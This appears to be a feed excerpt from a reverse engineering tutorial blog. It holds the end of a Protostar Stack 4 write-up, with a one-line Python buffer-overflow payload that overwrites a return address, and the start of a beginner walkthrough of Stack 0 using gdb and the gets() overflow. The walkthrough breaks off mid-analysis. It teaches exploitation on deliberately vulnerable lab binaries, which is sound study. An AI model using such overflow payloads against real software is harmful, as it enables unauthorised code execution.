&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>user@protostar:/opt/protostar/bin$ python -c &lt;span style="color:#e6db74">&amp;#39;print &amp;#34;A&amp;#34;*76+&amp;#34;\xf4\x83\x04\x08&amp;#34;&amp;#39;&lt;/span> | ./stack4
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>code flow successfully changed
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Segmentation fault
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>user@protostar:/opt/protostar/bin$
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="references--lessons-learnt">References / Lessons Learnt&lt;/h2>
&lt;p>In this article, we learnt:&lt;/p>
&lt;ul>
&lt;li>Getting information about different sections of a program in gdb&lt;/li>
&lt;li>Searching for values in a section of the program through gdb&lt;/li>
&lt;li>Extending our knowledge of stack/buffer overflow to override program execution by manipulating return address (Also known as ROP or Return Oriented Programming attack)&lt;/li>
&lt;li>About stack frames and esp/ebp/eip registers&lt;/li>
&lt;/ul>
&lt;p>You can refer to the below links for reading up more about some of the things discussed above. If you have any queries or suggestions, please leave a comment here or ping me &lt;a href="https://twitter.com/shantanugoel/">@shantanugoel&lt;/a>&lt;/p>
&lt;ul>
&lt;li>&lt;a href="https://en.wikipedia.org/wiki/Return-oriented_programming">Return Oriented Programming&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://en.wikipedia.org/wiki/Function_prologue">Function Prologue&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://en.wikibooks.org/wiki/X86_Disassembly/Functions_and_Stack_Frames">Functions and Stack Frames&lt;/a>&lt;/li>
&lt;/ul></content></item><item><title>Practical Reverse Engineering Tutorials Part 1: Introduction &amp; Protostar Stack 0</title><link>https://shantanugoel.com/2017/11/16/practical-reverse-engineering-tutorial-1/</link><pubDate>Thu, 16 Nov 2017 08:46:24 +0530</pubDate><guid>https://shantanugoel.com/2017/11/16/practical-reverse-engineering-tutorial-1/</guid><description>&lt;h2 id="what-is-this-about">What is this about?&lt;/h2>
&lt;p>This article is the 1st part of the &lt;a href="https://shantanugoel.com/tags/practical-reverse-engineering-tutorial-series">Practical Reverse Engineering Tutorials&lt;/a> series. This series is geared towards a structured, but almost completely practical, approach to learn Reverse Engineering. Many of the existing articles/books take a long winded approach to teach RE which is prefixed with a lot of theory before the reader can get their hands dirty. This series will take a different approach of picking up various challenges in the order of increasing difficulty and help the reader in exploring ways how to break them. I&amp;rsquo;ll try to keep mundane theory limited to the portions needed to beat the current challenge in consideration. Hopefully, this keeps the articles short, precise and interesting enough for readers to keep their attention span intact.&lt;/p></description><content>&lt;h2 id="what-is-this-about">What is this about?&lt;/h2>
&lt;p>This article is the 1st part of the &lt;a href="https://shantanugoel.com/tags/practical-reverse-engineering-tutorial-series">Practical Reverse Engineering Tutorials&lt;/a> series. This series is geared towards a structured, but almost completely practical, approach to learn Reverse Engineering. Many of the existing articles/books take a long winded approach to teach RE which is prefixed with a lot of theory before the reader can get their hands dirty. This series will take a different approach of picking up various challenges in the order of increasing difficulty and help the reader in exploring ways how to break them. I&amp;rsquo;ll try to keep mundane theory limited to the portions needed to beat the current challenge in consideration. Hopefully, this keeps the articles short, precise and interesting enough for readers to keep their attention span intact.&lt;/p>
&lt;p>I&amp;rsquo;d like to believe that these articles will prove helpful to those who are completely new to the world of reverse engineering. But I hope that even intermediate level readers would be able to make use of these by picking up the articles according to their appropriate levels.&lt;/p>
&lt;p>Pre-requisite for these articles is basic knowledge of programming concepts, prefereably C. Any kind of prior experience with any assembly language is good but not mandatory.&lt;/p>
&lt;p>For any queries, suggestions or feedback, please leave a comment here or ping me &lt;a href="https://twitter.com/shantanugoel">@shantanugoel&lt;/a>&lt;/p>
&lt;h2 id="exploit-exercises--protostar">Exploit Exercises / Protostar&lt;/h2>
&lt;p>For the first few articles of this series, we&amp;rsquo;ll work through some of the challenges from &lt;a href="https://exploit-exercises.com">Exploit Exercises&lt;/a>, starting with &lt;a href="https://exploit-exercises.com/protostar/">Protostar&lt;/a>.&lt;/p>
&lt;p>Note that although most of the challenges on exploit exercises provide source code of the challenge, we&amp;rsquo;d try to hack our way using purely reverse engineering as much as possible without looking at the source code. This would lead to better learning and avoid guiding you towards the solution pre-maturely. I strongly recommend that you do not look at the C source unless you&amp;rsquo;ve completed the below artcile fully or are not able to make connection to the assembly code at all after serious effort.&lt;/p>
&lt;h2 id="setup">Setup&lt;/h2>
&lt;p>To create the setup, follow the below steps:&lt;/p>
&lt;ul>
&lt;li>Download the Protostar ISO file from &lt;a href="https://exploit-exercises.com/download/">https://exploit-exercises.com/download/&lt;/a>&lt;/li>
&lt;li>Download and install VMWare Workstation Player or VirtualBox&lt;/li>
&lt;li>Create a new virtual machine in the vm software you downloaded using the nebula ISO from the first step&lt;/li>
&lt;li>The iso is a live CD, so you can boot from it directly, instead of having to install it in the VM&lt;/li>
&lt;/ul>
&lt;p>We&amp;rsquo;re all set now to begin&lt;/p>
&lt;h2 id="stack-0">Stack 0&lt;/h2>
&lt;p>&lt;a href="https://exploit-exercises.com/protostar/stack0/">Stack0&lt;/a> is the first challenge in protostar.&lt;/p>
&lt;h3 id="preparing-for-the-challenge">Preparing for the challenge&lt;/h3>
&lt;p>The webpage says that the challenge is located at &lt;code>/opt/protostar/bin/stack0&lt;/code>, so login to the VM and run this program. It looks like it is waiting for some input. On entering any data, it seems to tell us we were wrong with a message &lt;code>Try again?&lt;/code>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>user@protostar:/opt/protostar/bin$ ./stack0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>asd
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Try again?
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>user@protostar:/opt/protostar/bin$
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>We run &lt;code>strings&lt;/code> command on the stack0 program to find out interesting text present in it, and see another one &lt;code>you have changed the 'modified' variable&lt;/code>, which seems to be our target.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>user@protostar:/opt/protostar/bin$ strings stack0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>/lib/ld-linux.so.2
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>__gmon_start__
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>libc.so.6
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>_IO_stdin_used
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>gets
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>puts
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>__libc_start_main
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>GLIBC_2.0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>PTRh@
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">[&lt;/span>^_&lt;span style="color:#f92672">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>you have changed the &lt;span style="color:#e6db74">&amp;#39;modified&amp;#39;&lt;/span> variabley
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Try again?
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>user@protostar:/opt/protostar/bin$
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="static-analysis">Static Analysis&lt;/h3>
&lt;p>Now that we know what we need to achieve, we start our reverse engineering by doing static analysis of the program. There are several utilities to look at the low level code of the program. However, we will be using &lt;code>gdb&lt;/code> here which can help us later in dynamic analysis as well. gdb or The GNU Project Debugger is a popular open source debugger. We&amp;rsquo;ll graduate to more powerful tools or use reverse engineering oriented plugins for gdb later, but for now a vanilla gdb will do. It is already installed in the protostar VM. A debugger allows us to examine the internal state of the program as it executes at instruction/register level.&lt;/p>
&lt;p>Some of the important commands that you&amp;rsquo;d use during the static analysis for this challenge are:&lt;/p>
&lt;p>&lt;code>set disassembly-flavor intel&lt;/code>: While this is optional, but it allows to see the disassembled code in a more readable format.&lt;/p>
&lt;p>&lt;code>disassemble &amp;lt;function&amp;gt;&lt;/code>: This command displays the disassembled code of &lt;code>function&lt;/code>&lt;/p>
&lt;p>You can read more about these commands at &lt;a href="https://sourceware.org/gdb/current/onlinedocs/gdb/">https://sourceware.org/gdb/current/onlinedocs/gdb/&lt;/a> or &lt;a href="http://visualgdb.com/gdbreference/commands/">http://visualgdb.com/gdbreference/commands/&lt;/a>&lt;/p>
&lt;p>Using the above information, we load the &lt;code>stack0&lt;/code> executable in GDB and disassemble the function &lt;code>main&lt;/code>.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>user@protostar:/opt/protostar/bin$ gdb stack0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>GNU gdb &lt;span style="color:#f92672">(&lt;/span>GDB&lt;span style="color:#f92672">)&lt;/span> 7.0.1-debian
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Copyright &lt;span style="color:#f92672">(&lt;/span>C&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#ae81ff">2009&lt;/span> Free Software Foundation, Inc.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>License GPLv3+: GNU GPL version &lt;span style="color:#ae81ff">3&lt;/span> or later &amp;lt;http://gnu.org/licenses/gpl.html&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>This is free software: you are free to change and redistribute it.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>There is NO WARRANTY, to the extent permitted by law. Type &lt;span style="color:#e6db74">&amp;#34;show copying&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>and &lt;span style="color:#e6db74">&amp;#34;show warranty&amp;#34;&lt;/span> &lt;span style="color:#66d9ef">for&lt;/span> details.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>This GDB was configured as &lt;span style="color:#e6db74">&amp;#34;i486-linux-gnu&amp;#34;&lt;/span>.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>For bug reporting instructions, please see:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&amp;lt;http://www.gnu.org/software/gdb/bugs/&amp;gt;...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Reading symbols from /opt/protostar/bin/stack0...done.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">(&lt;/span>gdb&lt;span style="color:#f92672">)&lt;/span> set disassembly-flavor intel
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">(&lt;/span>gdb&lt;span style="color:#f92672">)&lt;/span> disassemble main
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Dump of assembler code &lt;span style="color:#66d9ef">for&lt;/span> &lt;span style="color:#66d9ef">function&lt;/span> main:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x080483f4 &amp;lt;main+0&amp;gt;: push ebp
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x080483f5 &amp;lt;main+1&amp;gt;: mov ebp,esp
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x080483f7 &amp;lt;main+3&amp;gt;: and esp,0xfffffff0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x080483fa &amp;lt;main+6&amp;gt;: sub esp,0x60
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x080483fd &amp;lt;main+9&amp;gt;: mov DWORD PTR &lt;span style="color:#f92672">[&lt;/span>esp+0x5c&lt;span style="color:#f92672">]&lt;/span>,0x0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x08048405 &amp;lt;main+17&amp;gt;: lea eax,&lt;span style="color:#f92672">[&lt;/span>esp+0x1c&lt;span style="color:#f92672">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x08048409 &amp;lt;main+21&amp;gt;: mov DWORD PTR &lt;span style="color:#f92672">[&lt;/span>esp&lt;span style="color:#f92672">]&lt;/span>,eax
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x0804840c &amp;lt;main+24&amp;gt;: call 0x804830c &amp;lt;gets@plt&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x08048411 &amp;lt;main+29&amp;gt;: mov eax,DWORD PTR &lt;span style="color:#f92672">[&lt;/span>esp+0x5c&lt;span style="color:#f92672">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x08048415 &amp;lt;main+33&amp;gt;: test eax,eax
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x08048417 &amp;lt;main+35&amp;gt;: je 0x8048427 &amp;lt;main+51&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x08048419 &amp;lt;main+37&amp;gt;: mov DWORD PTR &lt;span style="color:#f92672">[&lt;/span>esp&lt;span style="color:#f92672">]&lt;/span>,0x8048500
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x08048420 &amp;lt;main+44&amp;gt;: call 0x804832c &amp;lt;puts@plt&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x08048425 &amp;lt;main+49&amp;gt;: jmp 0x8048433 &amp;lt;main+63&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x08048427 &amp;lt;main+51&amp;gt;: mov DWORD PTR &lt;span style="color:#f92672">[&lt;/span>esp&lt;span style="color:#f92672">]&lt;/span>,0x8048529
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x0804842e &amp;lt;main+58&amp;gt;: call 0x804832c &amp;lt;puts@plt&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x08048433 &amp;lt;main+63&amp;gt;: leave
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x08048434 &amp;lt;main+64&amp;gt;: ret
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>End of assembler dump.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">(&lt;/span>gdb&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h4 id="making-sense-of-the-assembly-code">Making sense of the assembly code&lt;/h4>
&lt;p>Well, so we got a&amp;hellip;.big pile of gibberish? So, this is how assembly code looks like. Very different from a regular C program, as you can see. On the left side, you can see the memory addresses where a particular instruction is present and on the right side the instruction. Each instruction is again composed of two parts:&lt;/p>
&lt;ul>
&lt;li>The instruction itself&lt;/li>
&lt;li>0 or more operands (which can be addresses or registers with some specific formatting that we will learn as we encounter it)&lt;/li>
&lt;/ul>
&lt;p>Now, although this is a small enough program, as good reverse engineers, we rarely go through the whole program immediately which would require us to know each assembly instruction as well as take a lot of time. So, instead we will make some intelligent guesses and look at only the instructions/code that we really need to know. Just know these basic things before moving forward:&lt;/p>
&lt;ul>
&lt;li>Any instruction that works on some data either takes one or more addresses and/or registers as operands, which it operates on&lt;/li>
&lt;li>A register like eax is a basically a temporary/scratch memory close to the CPU for getting fast access to a data being used locally frequently&lt;/li>
&lt;li>There are few special registers. For current problem, know that ebp is the Stack Base pointer or the bottom of current stack frame, esp is the stack pointer or the current top of the stack, eip is the instruction pointer or the address of the instruction which is just about to be executed. We&amp;rsquo;ll learn more about the ebp/esp when we do a real stack overflow problem&lt;/li>
&lt;li>A square bracket &lt;code>[]&lt;/code> around a address or register signifies that the instruction refers to the value present in that address/register as the source or destination of the operation instead of the address/register itself.&lt;/li>
&lt;li>For most operations involving a source and destination operand, the left operand is the destination.&lt;/li>
&lt;/ul>
&lt;p>If you face problem in understanding the below information and think you need to understand x86 assembly a bit more before moving forward, you can use this very short and simple guide for the same: &lt;a href="https://www.cs.virginia.edu/~evans/cs216/guides/x86.html">https://www.cs.virginia.edu/~evans/cs216/guides/x86.html&lt;/a>&lt;/p>
&lt;p>Many times, my first intuition is to find out the areas in code which lead to our success/failure cases and work backwards from there. From our preparation phase, we saw that the failure case printed a message &lt;code>Try again?&lt;/code> on the screen and the success case was potentially a message &lt;code>you have changed the 'modified' variable&lt;/code>. Skimming over the code quickly, you will notice 3 peculiar statements that you may already be familiar from your C programming.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>0x0804840c &amp;lt;main+24&amp;gt;: call 0x804830c &amp;lt;gets@plt&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x08048420 &amp;lt;main+44&amp;gt;: call 0x804832c &amp;lt;puts@plt&amp;gt;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>...
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x0804842e &amp;lt;main+58&amp;gt;: call 0x804832c &amp;lt;puts@plt&amp;gt;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>If you don&amp;rsquo;t remember what &lt;code>gets&lt;/code> and &lt;code>puts&lt;/code> do, you can look at their descriptions from their manpages (e.g. &lt;code>man puts&lt;/code>). In brief, &lt;code>gets&lt;/code> allows you to capture user input from stdin and &lt;code>puts&lt;/code> allows you to print output to stdout to display to the user. This matches with our observations in the previous section that it waited for user input when we ran the program and gave an error message on receiving the input. We also saw a 2nd string which was potentially the success message. So we have 1 gets and 2 puts statements corresponding to this, but we don&amp;rsquo;t know yet which one of the 2 puts statements is the success part and which one is the failure part.&lt;/p>
&lt;p>Anyways, we start moving a bit backwards from the first puts statement and try to make sense of each instruction:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>0x08048420 &amp;lt;main+44&amp;gt;: call 0x804832c &amp;lt;puts@plt&amp;gt;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Here, the &lt;code>call&lt;/code> instruction refers to calling a function specified by the address 0x804832c. The string inside &amp;lt;&amp;gt; is the disassembler telling you the symbol name associated with that address.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>0x08048419 &amp;lt;main+37&amp;gt;: mov DWORD PTR &lt;span style="color:#f92672">[&lt;/span>esp&lt;span style="color:#f92672">]&lt;/span>,0x8048500
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Here, the &lt;code>mov&lt;/code> instruction is moving the value 0x8048500 into the address pointed by the register esp. The X86 calling convention puts the arguments to a function onto the stack before calling it and here the esp is the &amp;ldquo;Stack pointer&amp;rdquo; register. So, this must be the address of the string being passed to puts that it must print. Keep this address 0x8048500 in mind for our next section (Dynamic Analysis).&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>0x08048411 &amp;lt;main+29&amp;gt;: mov eax,DWORD PTR &lt;span style="color:#f92672">[&lt;/span>esp+0x5c&lt;span style="color:#f92672">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x08048415 &amp;lt;main+33&amp;gt;: test eax,eax
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x08048417 &amp;lt;main+35&amp;gt;: je 0x8048427 &amp;lt;main+51&amp;gt;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Here we see that first we move some data from the address esp + 0x5c into eax. then the &lt;code>test&lt;/code> instruction checks whether eax is zero or not. It does this by AND&amp;rsquo;ing the left and right operand. Since eax is the left as well as the right operand, the AND result will be zero only if eax is zero. Then the &lt;code>je&lt;/code> (or jump if equal to) instruction will jump the program execution to the address 0x8048427 (i.e. it will skip the first puts statement and start executing near our 2nd puts statement) if eax was zero. Otherwise it will execute the first puts statement. It decides the &amp;ldquo;equal to&amp;rdquo; condition by looking at an internal flag called Zero Flag (or Z or ZF) and treats equals condition to be true if this flag is set. This is because a &lt;code>test&lt;/code> or a &lt;code>cmp&lt;/code> (compare) instruction will set the ZF to 1 if result of the AND of 2 operands (in case of test) or difference of 2 operands (in case of cmp) was 0.&lt;/p>
&lt;p>This seems like our decision maker code as if we can manipulate the value at [esp+0x5c] then we can control the flow of the program to either of the puts statements. So, let&amp;rsquo;s keep this address in mind for our dynamic analysis.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>0x08048405 &amp;lt;main+17&amp;gt;: lea eax,&lt;span style="color:#f92672">[&lt;/span>esp+0x1c&lt;span style="color:#f92672">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x08048409 &amp;lt;main+21&amp;gt;: mov DWORD PTR &lt;span style="color:#f92672">[&lt;/span>esp&lt;span style="color:#f92672">]&lt;/span>,eax
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x0804840c &amp;lt;main+24&amp;gt;: call 0x804830c &amp;lt;gets@plt&amp;gt;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Finally we reach the user input call. &lt;code>lea&lt;/code> instruction means &amp;ldquo;Load effective address&amp;rdquo;. It is a slightly tricky instruction in the sense that:&lt;/p>
&lt;ul>
&lt;li>it does the calculations only on the right side operand, not both and then stores the result in left operand&lt;/li>
&lt;li>the square brackets [] don&amp;rsquo;t really refer to the meaning that we know from other instructions (i.e. you dont need to find out further the value present at calculated address and can just ignore the [])&lt;/li>
&lt;/ul>
&lt;p>Combining this knowledge with the semantics of mov/call that we learnt earlier, we know that the program is collecting the user input and storing that into a location starting at esp+0x1c.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>0x080483fd &amp;lt;main+9&amp;gt;: mov DWORD PTR &lt;span style="color:#f92672">[&lt;/span>esp+0x5c&lt;span style="color:#f92672">]&lt;/span>,0x0
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>And then we come to this instruction which looks a bit familiar to us because we&amp;rsquo;ve already seen that address esp+0x5c earlier. So, this seems like the initialization statement for a variable which is set to 0 and then later checked whether it is still 0 or not.&lt;/p>
&lt;h3 id="the-vulnerability">The vulnerability&lt;/h3>
&lt;p>Our task then is to make this variable (at location esp+0x5c) 0 or non-zero depending on what do the 2 puts statements do. The only access to influence the program we have is through the input we can give to &lt;code>gets&lt;/code>. Hmm, so we dig deeper into the gets manpage and we see below:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-fallback" data-lang="fallback">&lt;span style="display:flex;">&lt;span>gets() reads a line from stdin into the buffer pointed to by s until either a terminating newline or EOF, which it replaces with a null byte (&amp;#39;\0&amp;#39;). No check for buffer overrun is performed (see BUGS below).
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Great! So we know that we need to update a value at address esp+0x5c and we know that we have a possibility to have unchecked writes done starting from esp+0x1c. You know where this is going, and we almost don&amp;rsquo;t even need further dynamic analysis to crack this now. But I&amp;rsquo;ll take you through a bit of dynamic analysis for a brief introduction to it and for confirming our theory.&lt;/p>
&lt;h3 id="dynamic-analysis">Dynamic Analysis&lt;/h3>
&lt;p>While in static analysis we carry out all our inspections without running the program, in dynamic analysis we monitor the internal state of the program while it is running. For this, we will run the program inside gdb. You should know the following basic commands for this:&lt;/p>
&lt;p>&lt;code>r&lt;/code>: Run the currently loaded program from beginning&lt;/p>
&lt;p>&lt;code>b *&amp;lt;address&amp;gt;&lt;/code>: Put a breakpoint at &amp;lt;address&amp;gt; so that the program stops execution when it reaches that address.&lt;/p>
&lt;p>&lt;code>c&lt;/code>: Continue execution&lt;/p>
&lt;p>&lt;code>info r&lt;/code>: This displays the current state of the CPU&amp;rsquo;s general purpose registers&lt;/p>
&lt;p>&lt;code>x/&amp;lt;n&amp;gt;&amp;lt;s&amp;gt; &amp;lt;address/register&amp;gt;&lt;/code>: This allows to examine the process memory at the given address or address contained in register. You can use various switches &amp;lt;s&amp;gt; with it to display a specific amount of memory and in a specific format. e.g., /i displays the memory as instructions, /x as hex, /s as strings, etc. The number &amp;lt;n&amp;gt; is used to display n units of memory&lt;/p>
&lt;p>Now, before we run the program, recall that we had 2 puts calls in our assembly code and we didn&amp;rsquo;t know which one was the success case and which was failure. So we simply try to read the strings present at the addresses which were passed to the puts calls.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">(&lt;/span>gdb&lt;span style="color:#f92672">)&lt;/span> x/s 0x8048500
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x8048500: &lt;span style="color:#e6db74">&amp;#34;you have changed the &amp;#39;modified&amp;#39; variable&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">(&lt;/span>gdb&lt;span style="color:#f92672">)&lt;/span> x/s 0x8048529
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>0x8048529: &lt;span style="color:#e6db74">&amp;#34;Try again?&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">(&lt;/span>gdb&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>So we knnow that our first puts call is the success case and the second one is failure. Now, our observation was that if the value at esp+0x5c was 0, then it goes to the second puts call and otherwise it goes to first. So, we have to somehow make this value non-zero to get success.&lt;/p>
&lt;p>We know that our area of interest is in the gets call through which we can manipulate the program memory. So let&amp;rsquo;s put couple of breakpoints, 1 before gets and 1 after and then run the program.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-shell" data-lang="shell">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">(&lt;/span>gdb&lt;span style="color:#f92672">)&lt;/span> b *0x0804840c
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Breakpoint &lt;span style="color:#ae81ff">1&lt;/span> at 0x804840c: file stack0/stack0.c, line 11.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">(&lt;/span>gdb&lt;span style="color:#f92672">)&lt;/span> b *0x08048411
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Breakpoint &lt;span style="color:#ae81ff">2&lt;/span> at 0x8048411: file stack0/stack0.c, line 13.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">(&lt;/span>gdb&lt;span style="color:#f92672">)&lt;/span> r
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Starting program: /opt/protostar/bin/stack0
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Breakpoint 1, 0x0804840c in main &lt;span style="color:#f92672">(&lt;/span>argc&lt;span style="color:#f92672">=&lt;/span>1, argv&lt;span style="color:#f92672">=&lt;/span>0xbffff864&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> at stack0/stack0.c:11
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>11 stack0/stack0.c: No such file or directory.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> in stack0/stack0.c
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">(&lt;/span>gdb&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Now, we are stopped right before executing the gets call. We know that the input is taken at esp+0x1c and the target variable is located at esp+0x5c. So, let&amp;rsquo;s see the state of the program memory around these areas.&lt;/p>
